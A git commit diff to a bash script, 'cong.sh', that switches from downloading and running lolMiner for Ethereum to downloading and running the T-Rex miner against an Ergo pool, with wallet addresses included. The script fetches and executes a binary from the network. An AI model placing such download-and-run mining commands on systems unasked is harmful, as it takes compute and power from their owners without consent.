78b7681ea064b9c415e54cd706e93690c537f80e
harummir <88335789+harummir@users.noreply.github.com>
2021-08-13 02:32:53 -0400

    Update cong.sh

--- cong.sh
+++ cong.sh
@@ -1,6 +1,5 @@
 #!/bin/bash
 apt-get install wget -y
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
-tar -xvf lolMiner_v1.29_Lin64.tar.gz
-cd 1.29
-./lolMiner --algo ETHASH --pool daggerhashimoto.eu.nicehash.com:3353 -u 3MYuuKJ78wazszEA8d3MLjKQW1tH7P6cyW.bius --ethstratum ETHPROXY
+wget https://github.com/trexminer/T-Rex/releases/download/0.21.5/t-rex-0.21.5-linux.tar.gz
+tar -xvf t-rex-0.21.5-linux.tar.gz
+./t-rex -a autolykos2 -o stratum+tcp://us.ergo.herominers.com:10250 -u 9iBQygF3jotYsT1JogiGvfdC7Ve8pLrPuqyqX5KR6kudFMn4eSs.RIG_TREX -p x
